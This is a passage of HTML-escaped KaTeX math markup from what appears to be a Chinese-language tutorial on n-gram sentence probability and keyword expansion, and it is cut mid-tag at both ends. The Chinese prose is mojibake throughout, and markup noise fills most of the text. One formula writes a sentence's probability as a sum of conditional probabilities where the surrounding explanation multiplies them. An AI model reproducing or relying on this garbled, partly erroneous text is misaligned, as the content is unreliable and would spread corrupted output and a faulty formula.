class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1052em;vertical-align:-0.3551999999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ£&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.34480000000000005em;&#34;&gt;&lt;span style=&#34;top:-2.5198em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mopen mtight&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3551999999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ¦‚ç‡å…¬å¼çš„æ„ä¹‰ä¸ºï¼šç¬¬ä¸€æ¬¡è¯ç¡®è®¤åï¼Œçœ‹åé¢çš„è¯åœ¨å‰é¢è¯å‡ºç°çš„æƒ…å†µä¸‹å‡ºç°çš„æ¦‚ç‡ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼Œå¥å­ &lt;strong&gt;ç‡•å­æ²¡æœ‰ä½ æˆ‘å¯æ€ä¹ˆæ´»å•Š&lt;/strong&gt;ï¼Œåˆ†è¯å &lt;strong&gt;ç‡•å­ æ²¡æœ‰ä½  æˆ‘å¯ æ€ä¹ˆæ´»&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆè¿™æ•´å¥è¯å‡ºç°çš„æ¦‚ç‡ï¼šp(ç‡•å­ï¼Œæ²¡æœ‰ä½ ï¼Œæˆ‘å¯ï¼Œæ€ä¹ˆæ´») = p(ç‡•å­)p(æ²¡æœ‰ä½ |ç‡•å­)p(æˆ‘å¯|ç‡•å­ï¼Œæ²¡æœ‰ä½ )p(æ€ä¹ˆæ´»|ç‡•å­ï¼Œæ²¡æœ‰ä½ ï¼Œæˆ‘å¯)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;p(ç‡•å­)è¡¨ç¤º&lt;strong&gt;ç‡•å­&lt;/strong&gt;è¿™ä¸ªè¯åœ¨è¯­æ–™åº“ä¸­å‡ºç°çš„æ¦‚ç‡ï¼›&lt;/li&gt;
&lt;li&gt;p(æ²¡æœ‰ä½ |ç‡•å­)è¡¨ç¤ºåœ¨&lt;strong&gt;ç‡•å­&lt;/strong&gt;åå‡ºç°&lt;strong&gt;æ²¡æœ‰ä½ &lt;/strong&gt;çš„æ¦‚ç‡ï¼›&lt;/li&gt;
&lt;li&gt;ä»¥æ­¤ç±»æ¨...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æŠŠè¿™äº›æ¦‚ç‡ä¸€æ¬¡ç›¸ä¹˜å°±æ˜¯æ•´å¥è¯å‡ºç°çš„æ¦‚ç‡ï¼Œç„¶åæŒ‰ç…§ç”¨æˆ·è¾“å…¥çš„è¯æ¡ï¼Œå–å‡ºè¯­æ–™åº“ä¸­æ¦‚ç‡çš„topkä¸ªè¯æ¡å°±å¯ä»¥å®ç°æ‰©å±•è¯æ¡çš„åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;munderover&gt;&lt;mo&gt;âˆ‘&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/munderover&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ£&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;p(s) = p(w_1,w_2,...,w_T) = \sum_{i=1}^{T}p(w_i|Context_i)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; 